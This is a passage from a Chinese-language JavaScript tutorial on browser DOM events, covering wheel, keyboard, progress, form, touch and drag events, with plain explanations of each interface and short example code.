   -  ``deltaZ`` ：数值，表示滚轮的 Z 轴滚动量，默认值是 0.0。
   -  ``deltaMode`` ：数值，表示相关的滚动事件的单位，适用于上面三个属性。 ``0`` 表示滚动单位为像素， ``1`` 表示单位为行， ``2`` 表示单位为页，默认为 ``0`` 。

实例属性
~~~~~~~

    ``WheelEvent`` 事件实例除了具有 ``Event`` 和 ``MouseEvent`` 的实例属性和实例方法，还有一些自己的实例属性，但是没有自己的实例方法。

   下面的属性都是只读属性。

   -  ``WheelEvent.deltaX`` ：数值，表示滚轮的水平滚动量。
   -  ``WheelEvent.deltaY`` ：数值，表示滚轮的垂直滚动量。
   -  ``WheelEvent.deltaZ`` ：数值，表示滚轮的 Z 轴滚动量。
   -  ``WheelEvent.deltaMode`` ：数值，表示上面三个属性的单位， ``0`` 是像素， ``1`` 是行， ``2`` 是页。

/🟠 键盘事件
===========


键盘事件的种类
------------

   键盘事件由用户击打键盘触发，主要有 ``keydown`` 、 ``keypress`` 、 ``keyup`` 三个事件，它们都继承了 ``KeyboardEvent`` 接口。

   -  ``keydown`` ：按下键盘时触发。
   -  ``keypress`` ：按下有值的键时触发，即按下 Ctrl、Alt、Shift、Meta 这样无值的键，这个事件不会触发。对于有值的键，按下时先触发 ``keydown`` 事件，再触发这个事件。
   -  ``keyup`` ：松开键盘时触发该事件。

   如果用户一直按键不松开，就会连续触发键盘事件，触发的顺序如下。

   1. keydown
   1. keypress
   1. keydown
   1. keypress
   1. ...（重复以上过程）
   1. keyup

KeyboardEvent 接口概述
---------------------

    ``KeyboardEvent`` 接口用来描述用户与键盘的互动。这个接口继承了 ``Event`` 接口，并且定义了自己的实例属性和实例方法。

   浏览器原生提供 ``KeyboardEvent`` 构造函数，用来新建键盘事件的实例。

   .. code:: javascript

      new KeyboardEvent(type, options)

    ``KeyboardEvent`` 构造函数接受两个参数。第一个参数是字符串，表示事件类型；第二个参数是一个事件配置对象，该参数可选。除了 ``Event`` 接口提供的属性，还可以配置以下字段，它们都是可选。

   -  ``key`` ：字符串，当前按下的键，默认为空字符串。
   -  ``code`` ：字符串，表示当前按下的键的字符串形式，默认为空字符串。
   -  ``location`` ：整数，当前按下的键的位置，默认为 ``0`` 。
   -  ``ctrlKey`` ：布尔值，是否按下 Ctrl 键，默认为 ``false`` 。
   -  ``shiftKey`` ：布尔值，是否按下 Shift 键，默认为 ``false`` 。
   -  ``altKey`` ：布尔值，是否按下 Alt 键，默认为 ``false`` 。
   -  ``metaKey`` ：布尔值，是否按下 Meta 键，默认为 ``false`` 。
   -  ``repeat`` ：布尔值，是否重复按键，默认为 ``false`` 。

KeyboardEvent 的实例属性
----------------------


KeyboardEvent.altKey，KeyboardEvent.ctrlKey，KeyboardEvent.metaKey，KeyboardEvent.shiftKey
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



   -  ``KeyboardEvent.altKey`` ：是否按下 Alt 键
   -  ``KeyboardEvent.ctrlKey`` ：是否按下 Ctrl 键
   -  ``KeyboardEvent.metaKey`` ：是否按下 meta 键（Mac 系统是一个四瓣的小花，Windows 系统是 windows 键）
   -  ``KeyboardEvent.shiftKey`` ：是否按下 Shift 键

   下面是一个示例。

   .. code:: javascript

      function showChar(e) {
        console.log('ALT: ' + e.altKey);
        console.log('CTRL: ' + e.ctrlKey);
        console.log('Meta: ' + e.metaKey);
        console.log('Shift: ' + e.shiftKey);
      }
   
      document.body.addEventListener('keydown', showChar, false);

KeyboardEvent.code
~~~~~~~~~~~~~~~~~~~

    ``KeyboardEvent.code`` 属性返回一个字符串，表示当前按下的键的字符串形式。该属性只读。

   下面是一些常用键的字符串形式，其他键请查[文档](https://developer.mozilla.org/en-US/docs/Web/API/KeyboardEvent/code/code_values)。

   - 数字键0 - 9：返回 ``digit0``  -  ``digit9`` 
   - 字母键A - z：返回 ``KeyA``  -  ``KeyZ`` 
   - 功能键F1 - F12：返回  ``F1``  -  ``F12`` 
   - 方向键：返回 ``ArrowDown`` 、 ``ArrowUp`` 、 ``ArrowLeft`` 、 ``ArrowRight`` 
   - Alt 键：返回 ``AltLeft`` 或 ``AltRight`` 
   - Shift 键：返回 ``ShiftLeft`` 或 ``ShiftRight`` 
   - Ctrl 键：返回 ``ControlLeft`` 或 ``ControlRight`` 

KeyboardEvent.key
~~~~~~~~~~~~~~~~~~

    ``KeyboardEvent.key`` 属性返回一个字符串，表示按下的键名。该属性只读。

   如果按下的键代表可打印字符，则返回这个字符，比如数字、字母。

   如果按下的键代表不可打印的特殊字符，则返回预定义的键值，比如 Backspace，Tab，Enter，Shift，Control，Alt，CapsLock，Esc，Spacebar，PageUp，PageDown，End，Home，Left，Right，Up，Down，PrintScreen，Insert，Del，Win，F1～F12，NumLock，Scroll 等。

   如果同时按下一个控制键和一个符号键，则返回符号键的键名。比如，按下 Ctrl + a，则返回 ``a`` ；按下 Shift + a，则返回大写的 ``A`` 。

   如果无法识别键名，返回字符串 ``Unidentified`` 。

KeyboardEvent.location
~~~~~~~~~~~~~~~~~~~~~~~

    ``KeyboardEvent.location`` 属性返回一个整数，表示按下的键处在键盘的哪一个区域。它可能取以下值。

   - 0：处在键盘的主区域，或者无法判断处于哪一个区域。
   - 1：处在键盘的左侧，只适用那些有两个位置的键（比如 Ctrl 和 Shift 键）。
   - 2：处在键盘的右侧，只适用那些有两个位置的键（比如 Ctrl 和 Shift 键）。
   - 3：处在数字小键盘。

KeyboardEvent.repeat
~~~~~~~~~~~~~~~~~~~~~

    ``KeyboardEvent.repeat`` 返回一个布尔值，代表该键是否被按着不放，以便判断是否重复这个键，即浏览器会持续触发 ``keydown`` 和 ``keypress`` 事件，直到用户松开手为止。

KeyboardEvent 的实例方法
----------------------


KeyboardEvent.getModifierState()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``KeyboardEvent.getModifierState()`` 方法返回一个布尔值，表示是否按下或激活指定的功能键。它的常用参数如下。

   -  ``Alt`` ：Alt 键
   -  ``CapsLock`` ：大写锁定键
   -  ``Control`` ：Ctrl 键
   -  ``Meta`` ：Meta 键
   -  ``NumLock`` ：数字键盘开关键
   -  ``Shift`` ：Shift 键

   .. code:: javascript

      if (
        event.getModifierState('Control') +
        event.getModifierState('Alt') +
        event.getModifierState('Meta') > 1
      ) {
        return;
      }

   上面代码表示，只要 ``Control`` 、 ``Alt`` 、 ``Meta`` 里面，同时按下任意两个或两个以上的键就返回。

/🟠 进度事件
===========

进度事件的种类
------------

   进度事件用来描述资源加载的进度，主要由 AJAX 请求、 ``<img>`` 、 ``<audio>`` 、 ``<video>`` 、 ``<style>`` 、 ``<link>`` 等外部资源的加载触发，继承了 ``ProgressEvent`` 接口。它主要包含以下几种事件。

   -  ``abort`` ：外部资源中止加载时（比如用户取消）触发。如果发生错误导致中止，不会触发该事件。
   -  ``error`` ：由于错误导致外部资源无法加载时触发。
   -  ``load`` ：外部资源加载成功时触发。
   -  ``loadstart`` ：外部资源开始加载时触发。
   -  ``loadend`` ：外部资源停止加载时触发，发生顺序排在 ``error`` 、 ``abort`` 、 ``load`` 等事件的后面。
   -  ``progress`` ：外部资源加载过程中不断触发。
   -  ``timeout`` ：加载超时时触发。

   注意，除了资源下载，文件上传也存在这些事件。

   下面是一个例子。

   .. code:: javascript

      image.addEventListener('load', function (event) {
        image.classList.add('finished');
      });
   
      image.addEventListener('error', function (event) {
        image.style.display = 'none';
      });

   上面代码在图片元素加载完成后，为图片元素添加一个 ``finished`` 的 Class。如果加载失败，就把图片元素的样式设置为不显示。

   有时候，图片加载会在脚本运行之前就完成，尤其是当脚本放置在网页底部的时候，因此有可能 ``load`` 和 ``error`` 事件的监听函数根本不会执行。所以，比较可靠的方式，是用 ``complete`` 属性先判断一下是否加载完成。

   .. code:: javascript

      function loaded() {
        // ...
      }
   
      if (image.complete) {
        loaded();
      } else {
        image.addEventListener('load', loaded);
      }

   由于 DOM 的元素节点没有提供是否加载错误的属性，所以 ``error`` 事件的监听函数最好放在 ``<img>`` 元素的 HTML 代码中，这样才能保证发生加载错误时百分之百会执行。

   .. code:: html

      <img src="/wrong/url" onerror="this.style.display='none';" />

    ``loadend`` 事件的监听函数，可以用来取代 ``abort`` 事件、 ``load`` 事件、 ``error`` 事件的监听函数，因为它总是在这些事件之后发生。

   .. code:: javascript

      req.addEventListener('loadend', loadEnd, false);
   
      function loadEnd(e) {
        console.log('传输结束，成功失败未知');
      }

    ``loadend`` 事件本身不提供关于进度结束的原因，但可以用它来做所有加载结束场景都需要做的一些操作。

   另外， ``error`` 事件有一个特殊的性质，就是不会冒泡。所以，子元素的 ``error`` 事件，不会触发父元素的 ``error`` 事件监听函数。

ProgressEvent 接口
------------------

    ``ProgressEvent`` 接口主要用来描述外部资源加载的进度，比如 AJAX 加载、 ``<img>`` 、 ``<video>`` 、 ``<style>`` 、 ``<link>`` 等外部资源加载。进度相关的事件都继承了这个接口。

   浏览器原生提供了 ``ProgressEvent()`` 构造函数，用来生成事件实例。

   .. code:: javascript

      new ProgressEvent(type, options)

    ``ProgressEvent()`` 构造函数接受两个参数。第一个参数是字符串，表示事件的类型，这个参数是必须的。第二个参数是一个配置对象，表示事件的属性，该参数可选。配置对象除了可以使用 ``Event`` 接口的配置属性，还可以使用下面的属性，所有这些属性都是可选的。

   -  ``lengthComputable`` ：布尔值，表示加载的总量是否可以计算，默认是 ``false`` 。
   -  ``loaded`` ：整数，表示已经加载的量，默认是 ``0`` 。
   -  ``total`` ：整数，表示需要加载的总量，默认是 ``0`` 。

    ``ProgressEvent`` 具有对应的实例属性。

   -  ``ProgressEvent.lengthComputable`` 
   -  ``ProgressEvent.loaded`` 
   -  ``ProgressEvent.total`` 

   如果 ``ProgressEvent.lengthComputable`` 为 ``false`` ， ``ProgressEvent.total`` 实际上是没有意义的。

   下面是一个例子。

   .. code:: javascript

      var p = new ProgressEvent('load', {
        lengthComputable: true,
        loaded: 30,
        total: 100,
      });
   
      document.body.addEventListener('load', function (e) {
        console.log('已经加载：' + (e.loaded / e.total) * 100 + '%');
      });
   
      document.body.dispatchEvent(p);
      // 已经加载：30%

   上面代码先构造一个 ``load`` 事件，抛出后被监听函数捕捉到。

   下面是一个实际的例子。

   .. code:: javascript

      var xhr = new XMLHttpRequest();
   
      xhr.addEventListener('progress', updateProgress, false);
      xhr.addEventListener('load', transferComplete, false);
      xhr.addEventListener('error', transferFailed, false);
      xhr.addEventListener('abort', transferCanceled, false);
   
      xhr.open();
   
      function updateProgress(e) {
        if (e.lengthComputable) {
          var percentComplete = e.loaded / e.total;
        } else {
          console.log('不能计算进度');
        }
      }
   
      function transferComplete(e) {
        console.log('传输结束');
      }
   
      function transferFailed(evt) {
        console.log('传输过程中发生错误');
      }
   
      function transferCanceled(evt) {
        console.log('用户取消了传输');
      }

   上面是下载过程的进度事件，还存在上传过程的进度事件。这时所有监听函数都要放在 ``XMLHttpRequest.upload`` 对象上面。

   .. code:: javascript

      var xhr = new XMLHttpRequest();
   
      xhr.upload.addEventListener('progress', updateProgress, false);
      xhr.upload.addEventListener('load', transferComplete, false);
      xhr.upload.addEventListener('error', transferFailed, false);
      xhr.upload.addEventListener('abort', transferCanceled, false);
   
      xhr.open();

/🟠 表单事件
===========

表单事件的种类
------------


input 事件
~~~~~~~~~~

    ``input`` 事件当 ``<input>`` 、 ``<select>`` 、 ``<textarea>`` 的值发生变化时触发。对于复选框（ ``<input type=checkbox>`` ）或单选框（ ``<input type=radio>`` ），用户改变选项时，也会触发这个事件。另外，对于打开 ``contenteditable`` 属性的元素，只要值发生变化，也会触发 ``input`` 事件。

    ``input`` 事件的一个特点，就是会连续触发，比如用户每按下一次按键，就会触发一次 ``input`` 事件。

    ``input`` 事件对象继承了 ``InputEvent`` 接口。

   该事件跟 ``change`` 事件很像，不同之处在于 ``input`` 事件在元素的值发生变化后立即发生，而 ``change`` 在元素失去焦点时发生，而内容此时可能已经变化多次。也就是说，如果有连续变化， ``input`` 事件会触发多次，而 ``change`` 事件只在失去焦点时触发一次。

   下面是 ``<select>`` 元素的例子。

   .. code:: javascript

      /* HTML 代码如下
      <select id="mySelect">
        <option value="1">1</option>
        <option value="2">2</option>
        <option value="3">3</option>
      </select>
      */
   
      function inputHandler(e) {
        console.log(e.target.value)
      }
   
      var mySelect = document.querySelector('#mySelect');
      mySelect.addEventListener('input', inputHandler);

   上面代码中，改变下拉框选项时，会触发 ``input`` 事件，从而执行回调函数 ``inputHandler`` 。

select 事件
~~~~~~~~~~

    ``select`` 事件当在 ``<input>`` 、 ``<textarea>`` 里面选中文本时触发。

   .. code:: javascript

      // HTML 代码如下
      // <input id="test" type="text" value="Select me!" />
   
      var elem = document.getElementById('test');
      elem.addEventListener('select', function (e) {
        console.log(e.type); // "select"
      }, false);

   选中的文本可以通过 ``event.target`` 元素的 ``selectionDirection`` 、 ``selectionEnd`` 、 ``selectionStart`` 和 ``value`` 属性拿到。

change 事件
~~~~~~~~~~

    ``change`` 事件当 ``<input>`` 、 ``<select>`` 、 ``<textarea>`` 的值发生变化时触发。它与 ``input`` 事件的最大不同，就是不会连续触发，只有当全部修改完成时才会触发，另一方面 ``input`` 事件必然伴随 ``change`` 事件。具体来说，分成以下几种情况。

   - 激活单选框（radio）或复选框（checkbox）时触发。
   - 用户提交时触发。比如，从下列列表（select）完成选择，在日期或文件输入框完成选择。
   - 当文本框或 ``<textarea>`` 元素的值发生改变，并且丧失焦点时触发。

   下面是一个例子。

   .. code:: javascript

      // HTML 代码如下
      // <select size="1" onchange="changeEventHandler(event);">
      //   <option>chocolate</option>
      //   <option>strawberry</option>
      //   <option>vanilla</option>
      // </select>
   
      function changeEventHandler(event) {
        console.log(event.target.value);
      }

   如果比较一下上面 ``input`` 事件的例子，你会发现对于 ``<select>`` 元素来说， ``input`` 和 ``change`` 事件基本是等价的。

invalid 事件
~~~~~~~~~~~

   用户提交表单时，如果表单元素的值不满足校验条件，就会触发 ``invalid`` 事件。

   .. code:: html

      <form>
        <input type="text" required oninvalid="console.log('invalid input')" />
        <button type="submit">提交</button>
      </form>

   上面代码中，输入框是必填的。如果不填，用户点击按钮提交时，就会触发输入框的 ``invalid`` 事件，导致提交被取消。

reset 事件，submit 事件
~~~~~~~~~~~~~~~~~~~~~

   这两个事件发生在表单对象 ``<form>`` 上，而不是发生在表单的成员上。

    ``reset`` 事件当表单重置（所有表单成员变回默认值）时触发。

    ``submit`` 事件当表单数据向服务器提交时触发。注意， ``submit`` 事件的发生对象是 ``<form>`` 元素，而不是 ``<button>`` 元素，因为提交的是表单，而不是按钮。

InputEvent 接口
--------------

    ``InputEvent`` 接口主要用来描述 ``input`` 事件的实例。该接口继承了 ``Event`` 接口，还定义了一些自己的实例属性和实例方法。

   浏览器原生提供 ``InputEvent()`` 构造函数，用来生成实例对象。

   .. code:: javascript

      new InputEvent(type, options)

    ``InputEvent`` 构造函数可以接受两个参数。第一个参数是字符串，表示事件名称，该参数是必需的。第二个参数是一个配置对象，用来设置事件实例的属性，该参数是可选的。配置对象的字段除了 ``Event`` 构造函数的配置属性，还可以设置下面的字段，这些字段都是可选的。

   -  ``inputType`` ：字符串，表示发生变更的类型（详见下文）。
   -  ``data`` ：字符串，表示插入的字符串。如果没有插入的字符串（比如删除操作），则返回 ``null`` 或空字符串。
   -  ``dataTransfer`` ：返回一个 DataTransfer 对象实例，该属性通常只在输入框接受富文本输入时有效。

    ``InputEvent`` 的实例属性主要就是上面三个属性，这三个实例属性都是只读的。

   **（1）InputEvent.data**

    ``InputEvent.data`` 属性返回一个字符串，表示变动的内容。

   .. code:: javascript

      // HTML 代码如下
      // <input type="text" id="myInput">
      var input = document.getElementById('myInput');
      input.addEventListener('input', myFunction, false);
   
      function myFunction(e) {
        console.log(e.data);
      }

   上面代码中，如果手动在输入框里面输入 ``abc`` ，控制台会先输出 ``a`` ，再在下一行输出 ``b`` ，再在下一行输出 ``c`` 。然后选中 ``abc`` ，一次性将它们删除，控制台会输出 ``null`` 或一个空字符串。

   **（2）InputEvent.inputType**

    ``InputEvent.inputType`` 属性返回一个字符串，表示字符串发生变更的类型。

   对于常见情况，Chrome 浏览器的返回值如下。完整列表可以参考[文档](https://w3c.github.io/input-events/index.html#dom-inputevent-inputtype)。

   - 手动插入文本： ``insertText`` 
   - 粘贴插入文本： ``insertFromPaste`` 
   - 向后删除： ``deleteContentBackward`` 
   - 向前删除： ``deleteContentForward`` 

   **（3）InputEvent.dataTransfer**

    ``InputEvent.dataTransfer`` 属性返回一个 DataTransfer 实例。该属性只在文本框接受粘贴内容（insertFromPaste）或拖拽内容（ ``insertFromDrop`` ）时才有效。

/🟠 触摸事件
===========

触摸操作概述
----------

   浏览器的触摸 API 由三个部分组成。

   - Touch：一个触摸点
   - TouchList：多个触摸点的集合
   - TouchEvent：触摸引发的事件实例

    ``Touch`` 接口的实例对象用来表示触摸点（一根手指或者一根触摸笔），包括位置、大小、形状、压力、目标元素等属性。有时，触摸动作由多个触摸点（多根手指）组成，多个触摸点的集合由 ``TouchList`` 接口的实例对象表示。 ``TouchEvent`` 接口的实例对象代表由触摸引发的事件，只有触摸屏才会引发这一类事件。

   很多时候，触摸事件和鼠标事件同时触发，即使这个时候并没有用到鼠标。这是为了让那些只定义鼠标事件、没有定义触摸事件的代码，在触摸屏的情况下仍然能用。如果想避免这种情况，可以用 ``event.preventDefault`` 方法阻止发出鼠标事件。

Touch 接口
----------


Touch 接口概述
~~~~~~~~~~~~~

   Touch 接口代表单个触摸点。触摸点可能是一根手指，也可能是一根触摸笔。

   浏览器原生提供 ``Touch`` 构造函数，用来生成 ``Touch`` 实例。

   .. code:: javascript

      var touch = new Touch(touchOptions);

    ``Touch`` 构造函数接受一个配置对象作为参数，它有以下属性。

   -  ``identifier`` ：必需，类型为整数，表示触摸点的唯一 ID。
   -  ``target`` ：必需，类型为元素节点，表示触摸点开始时所在的网页元素。
   -  ``clientX`` ：可选，类型为数值，表示触摸点相对于浏览器窗口左上角的水平距离，默认为0。
   -  ``clientY`` ：可选，类型为数值，表示触摸点相对于浏览器窗口左上角的垂直距离，默认为0。
   -  ``screenX`` ：可选，类型为数值，表示触摸点相对于屏幕左上角的水平距离，默认为0。
   -  ``screenY`` ：可选，类型为数值，表示触摸点相对于屏幕左上角的垂直距离，默认为0。
   -  ``pageX`` ：可选，类型为数值，表示触摸点相对于网页左上角的水平位置（即包括页面的滚动距离），默认为0。
   -  ``pageY`` ：可选，类型为数值，表示触摸点相对于网页左上角的垂直位置（即包括页面的滚动距离），默认为0。
   -  ``radiusX`` ：可选，类型为数值，表示触摸点周围受到影响的椭圆范围的 X 轴半径，默认为0。
   -  ``radiusY`` ：可选：类型为数值，表示触摸点周围受到影响的椭圆范围的 Y 轴半径，默认为0。
   -  ``rotationAngle`` ：可选，类型为数值，表示触摸区域的椭圆的旋转角度，单位为度数，在0到90度之间，默认值为0。
   -  ``force`` ：可选，类型为数值，范围在 ``0`` 到 ``1`` 之间，表示触摸压力。 ``0`` 代表没有压力， ``1`` 代表硬件所能识别的最大压力，默认为 ``0`` 。

Touch 接口的实例属性
~~~~~~~~~~~~~~~~~~

   **（1）Touch.identifier**

    ``Touch.identifier`` 属性返回一个整数，表示触摸点的唯一 ID。这个值在整个触摸过程保持不变，直到触摸事件结束。

   .. code:: javascript

      someElement.addEventListener('touchmove', function (e) {
        for (var i = 0; i < e.changedTouches.length; i++) {
          console.log(e.changedTouches[i].identifier);
        }
      }, false);

   **（2）Touch.screenX，Touch.screenY，Touch.clientX，Touch.clientY，pageX，pageY**

    ``Touch.screenX`` 属性和 ``Touch.screenY`` 属性，分别表示触摸点相对于屏幕左上角的横坐标和纵坐标，与页面是否滚动无关。

    ``Touch.clientX`` 属性和 ``Touch.clientY`` 属性，分别表示触摸点相对于浏览器视口左上角的横坐标和纵坐标，与页面是否滚动无关。

    ``Touch.pageX`` 属性和 ``Touch.pageY`` 属性，分别表示触摸点相对于当前页面左上角的横坐标和纵坐标，包含了页面滚动带来的位移。

   **（3）Touch.radiusX，Touch.radiusY，Touch.rotationAngle**

    ``Touch.radiusX`` 属性和 ``Touch.radiusY`` 属性，分别返回触摸点周围受到影响的椭圆范围的 X 轴半径和 Y 轴半径，单位为像素。乘以 2 就可以得到触摸范围的宽度和高度。

    ``Touch.rotationAngle`` 属性表示触摸区域的椭圆的旋转角度，单位为度数，在 ``0`` 到 ``90`` 度之间。

   上面这三个属性共同定义了用户与屏幕接触的区域，对于描述手指这一类非精确的触摸，很有帮助。指尖接触屏幕，触摸范围会形成一个椭圆，这三个属性就用来描述这个椭圆区域。

   下面是一个示例。

   .. code:: javascript

      div.addEventListener('touchstart', rotate);
      div.addEventListener('touchmove', rotate);
      div.addEventListener('touchend', rotate);
   
      function rotate(e) {
        var touch = e.changedTouches.item(0);
        e.preventDefault();
   
        src.style.width = touch.radiusX * 2 + 'px';
        src.style.height = touch.radiusY * 2 + 'px';
        src.style.transform = 'rotate(' + touch.rotationAngle + 'deg)';
      };

   **（4）Touch.force**

    ``Touch.force`` 属性返回一个 ``0`` 到 ``1`` 之间的数值，表示触摸压力。 ``0`` 代表没有压力， ``1`` 代表硬件所能识别的最大压力。

   **（5）Touch.target**

    ``Touch.target`` 属性返回一个元素节点，代表触摸发生时所在的那个元素节点。即使触摸点已经离开了这个节点，该属性依然不变。

TouchList 接口
--------------

    ``TouchList`` 接口表示一组触摸点的集合。它的实例是一个类似数组的对象，成员是 ``Touch`` 的实例对象，表示所有触摸点。用户用三根手指触摸，产生的 ``TouchList`` 实例就会包含三个成员，每根手指的触摸点对应一个 ``Touch`` 实例对象。

   它的实例主要通过触摸事件的 ``TouchEvent.touches`` 、 ``TouchEvent.changedTouches`` 、 ``TouchEvent.targetTouches`` 这几个属性获取。

   它的实例属性和实例方法只有两个。

   -  ``TouchList.length`` ：数值，表示成员数量（即触摸点的数量）。
   -  ``TouchList.item()`` ：返回指定位置的成员，它的参数是该成员的位置编号（从零开始）。

TouchEvent 接口
--------------


概述
~~~

   TouchEvent 接口继承了 Event 接口，表示由触摸引发的事件实例，通常来自触摸屏或轨迹板。除了被继承的属性以外，它还有一些自己的属性。

   浏览器原生提供 ``TouchEvent()`` 构造函数，用来生成触摸事件的实例。

   .. code:: javascript

      new TouchEvent(type, options)

    ``TouchEvent()`` 构造函数可以接受两个参数，第一个参数是字符串，表示事件类型；第二个参数是事件的配置对象，该参数是可选的，对象的所有属性也是可选的。除了 ``Event`` 接口的配置属性，该接口还有一些自己的配置属性。

   -  ``touches`` ： ``TouchList`` 实例，代表所有的当前处于活跃状态的触摸点，默认值是一个空数组 ``[]`` 。
   -  ``targetTouches`` ： ``TouchList`` 实例，代表所有处在触摸的目标元素节点内部、且仍然处于活动状态的触摸点，默认值是一个空数组 ``[]`` 。
   -  ``changedTouches`` ： ``TouchList`` 实例，代表本次触摸事件的相关触摸点，默认值是一个空数组 ``[]`` 。
   -  ``ctrlKey`` ：布尔值，表示 Ctrl 键是否同时按下，默认值为 ``false`` 。
   -  ``shiftKey`` ：布尔值，表示 Shift 键是否同时按下，默认值为 ``false`` 。
   -  ``altKey`` ：布尔值，表示 Alt 键是否同时按下，默认值为 ``false`` 。
   -  ``metaKey`` ：布尔值，表示 Meta 键（或 Windows 键）是否同时按下，默认值为 ``false`` 。

实例属性
~~~~~~~

   TouchEvent 接口的实例具有 ``Event`` 实例的所有属性和方法，此外还有一些它自己的实例属性，这些属性全部都是只读。

   **（1）TouchEvent.altKey，TouchEvent.ctrlKey，TouchEvent.shiftKey，TouchEvent.metaKey**

   -  ``TouchEvent.altKey`` ：布尔值，表示触摸时是否按下了 Alt 键。
   -  ``TouchEvent.ctrlKey`` ：布尔值，表示触摸时是否按下了 Ctrl 键。
   -  ``TouchEvent.shiftKey`` ：布尔值：表示触摸时是否按下了 Shift 键。
   -  ``TouchEvent.metaKey`` ：布尔值，表示触摸时是否按下了 Meta 键（或 Windows 键）。

   下面是一个示例。

   .. code:: javascript

      someElement.addEventListener('touchstart', function (e) {
        console.log('altKey = ' + e.altKey);
        console.log('ctrlKey = ' + e.ctrlKey);
        console.log('metaKey = ' + e.metaKey);
        console.log('shiftKey = ' + e.shiftKey);
      }, false);

   **（2）TouchEvent.changedTouches**

    ``TouchEvent.changedTouches`` 属性返回一个 ``TouchList`` 实例，成员是一组 ``Touch`` 实例对象，表示本次触摸事件的相关触摸点。

   对于不同的时间，该属性的含义有所不同。

   -  ``touchstart`` 事件：被激活的触摸点
   -  ``touchmove`` 事件：发生变化的触摸点
   -  ``touchend`` 事件：消失的触摸点（即不再被触碰的点）

   下面是一个示例。

   .. code:: javascript

      someElement.addEventListener('touchmove', function (e) {
        for (var i = 0; i < e.changedTouches.length; i++) {
          console.log(e.changedTouches[i].identifier);
        }
      }, false);

   **（3）TouchEvent.touches**

    ``TouchEvent.touches`` 属性返回一个 ``TouchList`` 实例，成员是所有仍然处于活动状态（即触摸中）的触摸点。一般来说，一个手指就是一个触摸点。

   下面是一个示例。

   .. code:: javascript

      someElement.addEventListener('touchstart', function (e) {
        switch (e.touches.length) {
          // 一根手指触摸
          case 1: handle_one_touch(e); break;
          // 两根手指触摸
          case 2: handle_two_touches(e); break;
          // 三根手指触摸
          case 3: handle_three_touches(e); break;
          // 其他情况
          default: console.log('Not supported'); break;
        }
      }, false);

   **（4）TouchEvent.targetTouches**

    ``TouchEvent.targetTouches`` 属性返回一个 ``TouchList`` 实例，成员是触摸事件的目标元素节点内部、所有仍然处于活动状态（即触摸中）的触摸点。

   .. code:: javascript

      function touches_in_target(ev) {
        return (ev.touches.length === ev.targetTouches.length ? true : false);
      }

   上面代码用来判断，是否所有触摸点都在目标元素内。

触摸事件的种类
------------

   触摸引发的事件，有以下几种。可以通过 ``TouchEvent.type`` 属性，查看到底发生的是哪一种事件。

   -  ``touchstart`` ：用户开始触摸时触发，它的 ``target`` 属性返回发生触摸的元素节点。
   -  ``touchend`` ：用户不再接触触摸屏时（或者移出屏幕边缘时）触发，它的 ``target`` 属性与 ``touchstart`` 事件一致的，就是开始触摸时所在的元素节点。它的 ``changedTouches`` 属性返回一个 ``TouchList`` 实例，包含所有不再触摸的触摸点（即 ``Touch`` 实例对象）。
   -  ``touchmove`` ：用户移动触摸点时触发，它的 ``target`` 属性与 ``touchstart`` 事件一致。如果触摸的半径、角度、力度发生变化，也会触发该事件。
   -  ``touchcancel`` ：触摸点取消时触发，比如在触摸区域跳出一个模态窗口（modal window）、触摸点离开了文档区域（进入浏览器菜单栏）、用户的触摸点太多，超过了支持的上限（自动取消早先的触摸点）。

   下面是一个例子。

   .. code:: javascript

      var el = document.getElementsByTagName('canvas')[0];
      el.addEventListener('touchstart', handleStart, false);
      el.addEventListener('touchmove', handleMove, false);
   
      function handleStart(evt) {
        evt.preventDefault();
        var touches = evt.changedTouches;
        for (var i = 0; i < touches.length; i++) {
          console.log(touches[i].pageX, touches[i].pageY);
        }
      }
   
      function handleMove(evt) {
        evt.preventDefault();
        var touches = evt.changedTouches;
        for (var i = 0; i < touches.length; i++) {
          var touch = touches[i];
          console.log(touch.pageX, touch.pageY);
        }
      }

/🟠 拖拉事件
===========

拖拉事件的种类
------------

   拖拉（drag）指的是，用户在某个对象上按下鼠标键不放，拖动它到另一个位置，然后释放鼠标键，将该对象放在那里。

   拖拉的对象有好几种，包括元素节点、图片、链接、选中的文字等等。在网页中，除了元素节点默认不可以拖拉，其他（图片、链接、选中的文字）都可以直接拖拉。为了让元素节点可拖拉，可以将该节点的 ``draggable`` 属性设为 ``true`` 。

   .. code:: html

      <div draggable="true">
        此区域可拖拉
      </div>

   上面代码的 ``div`` 区块，在网页中可以直接用鼠标拖动。松开鼠标键时，拖动效果就会消失，该区块依然在原来的位置。

    ``draggable`` 属性可用于任何元素节点，但是图片（ ``<img>`` ）和链接（ ``<a>`` ）不加这个属性，就可以拖拉。对于它们，用到这个属性的时候，往往是将其设为 ``false`` ，防止拖拉这两种元素。

   注意，一旦某个元素节点的 ``draggable`` 属性设为 ``true`` ，就无法再用鼠标选中该节点内部的文字或子节点了。

   当元素节点或选中的文本被拖拉时，就会持续触发拖拉事件，包括以下一些事件。

   -  ``drag`` ：拖拉过程中，在被拖拉的节点上持续触发（相隔几百毫秒）。
   -  ``dragstart`` ：用户开始拖拉时，在被拖拉的节点上触发，该事件的 ``target`` 属性是被拖拉的节点。通常应该在这个事件的监听函数中，指定拖拉的数据。
   -  ``dragend`` ：拖拉结束时（释放鼠标键或按下 ESC 键）在被拖拉的节点上触发，该事件的 ``target`` 属性是被拖拉的节点。它与 ``dragstart`` 事件，在同一个节点上触发。不管拖拉是否跨窗口，或者中途被取消， ``dragend`` 事件总是会触发的。
   -  ``dragenter`` ：拖拉进入当前节点时，在当前节点上触发一次，该事件的 ``target`` 属性是当前节点。通常应该在这个事件的监听函数中，指定是否允许在当前节点放下（drop）拖拉的数据。如果当前节点没有该事件的监听函数，或者监听函数不执行任何操作，就意味着不允许在当前节点放下数据。在视觉上显示拖拉进入当前节点，也是在这个事件的监听函数中设置。
   -  ``dragover`` ：拖拉到当前节点上方时，在当前节点上持续触发（相隔几百毫秒），该事件的 ``target`` 属性是当前节点。该事件与 ``dragenter`` 事件的区别是， ``dragenter`` 事件在进入该节点时触发，然后只要没有离开这个节点， ``dragover`` 事件会持续触发。
   -  ``dragleave`` ：拖拉操作离开当前节点范围时，在当前节点上触发，该事件的 ``target`` 属性是当前节点。如果要在视觉上显示拖拉离开操作当前节点，就在这个事件的监听函数中设置。
